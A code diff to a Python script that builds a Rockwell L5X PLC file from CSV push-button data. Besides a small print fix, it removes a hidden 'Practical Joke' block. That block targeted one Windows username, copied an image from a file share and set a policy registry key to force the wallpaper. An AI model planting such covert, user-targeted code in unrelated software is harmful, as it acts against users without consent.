@@ -1,11 +1,9 @@
 #region - Imports
 import sys, os, shutil
-import _winreg
 from PIA.Rockwell.Types import CommonType
 from PIA.Rockwell.XML.Tools import *
 from PIA.Rockwell.XML.Templates import *
 from PIA.Rockwell.Util.Templates.Datatypes.PushButton import *
-from __future__ import print_function
 
 import lxml
 from lxml import etree
@@ -42,7 +40,7 @@ $Reads Data from '.pb.csv' and writes to './PB.L5X'
 
 #region - Parse/Check Input Arguments
 if len(ARGS) == 1:
-    print HELP
+    print(HELP)
     sys.exit()
 elif len(ARGS) == 2:
     fname = ARGS[1] #Initialize FileName Variable
@@ -201,29 +199,4 @@ print
 print "Writing to Output File: %s ..." % (oname)
 print
 PROJECT.writeToFile(oname)
-#endregion
-
-#region - Practical Joke
-if sys.platform == "win32" and os.environ.get("USERNAME") == "rcampbell":
-    try:
-        REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        PATH = r"\\Ev-filesrv1\EVANA Data\Users\Seaton\s0_5hOrt.jpg"
-        DIR = r"C:\Program Files\Windows Images"
-        KEY_VALUE = r"C:\Program Files\Windows Images\s0_5hOrt.jpg"
-
-        try:
-            os.makedirs(DIR) # create all directories, raise an error if it already exists
-        except:
-            pass
-        shutil.copy(PATH, DIR)
-
-        if set_reg(r"wallpaper", KEY_VALUE): print "-*-"
-
-        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
-        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(registry_key, r"wallpaper", 0, _winreg.REG_SZ, KEY_VALUE)
-        _winreg.CloseKey(registry_key)
-    except:
-        print "-^-"
-
 #endregion
